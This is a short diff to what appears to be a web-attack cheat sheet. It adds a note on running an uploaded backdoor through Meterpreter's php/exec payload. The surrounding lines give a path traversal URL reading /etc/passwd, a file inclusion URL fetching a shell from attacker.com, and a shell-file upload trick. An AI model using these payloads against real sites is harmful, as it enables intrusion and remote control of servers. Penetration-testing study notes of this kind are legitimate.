@@ -103,6 +103,7 @@ Example: fileshare.com/files.php?file=../../../../../../etc/passwd
 Remote File Inclusion (RFI)
 Example: fileshare.com/files.php?file=http://attacker.com/shells/shell.txt
 //MSF use exploit/unix/webapp/php_include
+//Once backdoor uploaded via Meterpreter can use the php/exec payload to execute the backdoor, set CMD shell.exe
 
 Unrestricted File Upload
 //If file upload doesnt check against file extension uploads, can upload file such as shell2.php and browse
